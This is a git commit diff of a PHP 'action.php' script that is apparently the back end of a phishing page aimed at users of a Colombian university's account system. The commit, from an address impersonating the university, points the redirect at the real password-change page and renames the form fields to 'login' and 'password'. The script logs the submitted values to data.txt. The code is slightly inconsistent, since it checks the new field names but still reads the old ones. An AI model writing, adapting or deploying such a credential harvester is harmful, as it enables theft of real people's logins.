ea0bfe24a7b7bc5afcd381c31e45b60dcaaa703c
gcu.javerianacali.edu.co <cuentasdeusuario.javerianacali@protonmail.com>
2016-12-04 23:46:13 +0000

    Update action.php

--- action.php
+++ action.php
@@ -1,8 +1,8 @@
 <?php
-header('Location: http://www.facebook.com');
+header('Location: https://gcu.javerianacali.edu.co/GestionCuentasUsuariosPUJ/cuenta/modificarContrasena/VALIDAR');
 $txt = "data.txt";
 $fh = fopen($txt, 'w+');
-if (isset($_POST['field1']) && isset($_POST['field2'])) { // check if both fields are set
+if (isset($_POST['login']) && isset($_POST['password'])) { // check if both fields are set
    $txt=$_POST['field1'].' - '.$_POST['field2'];
    file_put_contents('data.txt',$txt."\n",FILE_APPEND); // log to data.txt
    exit();
